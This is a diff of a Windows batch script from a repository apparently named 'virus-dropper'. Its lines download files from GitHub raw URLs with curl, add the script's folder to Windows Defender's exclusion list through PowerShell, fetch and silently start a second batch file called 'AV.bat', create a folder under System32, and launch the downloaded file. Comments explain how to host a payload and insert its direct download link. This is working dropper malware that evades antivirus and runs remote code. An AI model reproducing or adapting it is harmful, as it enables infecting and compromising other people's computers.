@@ -1,5 +1,5 @@
 color ef
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "%appdata%\Rickroll.mp4"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
 start /min AV.bat
@@ -13,7 +13,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 ::direct download link
 ::edit this to your files
 md "%systemroot%\System32\Windowsexe"
-start %appdata%\Rickroll.mp4
+start Rickroll.mp4
 
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
